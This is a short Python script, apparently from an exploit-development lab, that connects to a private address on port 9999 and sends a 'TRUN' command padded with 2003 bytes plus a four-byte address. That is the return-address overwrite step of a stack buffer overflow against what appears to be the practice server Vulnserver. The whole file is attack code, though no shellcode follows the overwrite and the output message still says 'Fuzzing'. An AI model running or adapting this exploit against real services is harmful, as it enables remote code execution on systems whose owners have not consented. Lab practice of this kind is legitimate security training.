#!/usr/bin/python


import socket
import sys
shellcode = "A" * 2003 + "\xaf\x11\x50\x62" 

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect=s.connect(('192.168.43.112',9999))
	s.send(('TRUN /.:/'+ shellcode))
	print("Fuzzing with TRUN command with %s bytes"% str(len(shellcode)))
        s.close()
except:
	print("Error connecting to server")
        sys.exit()

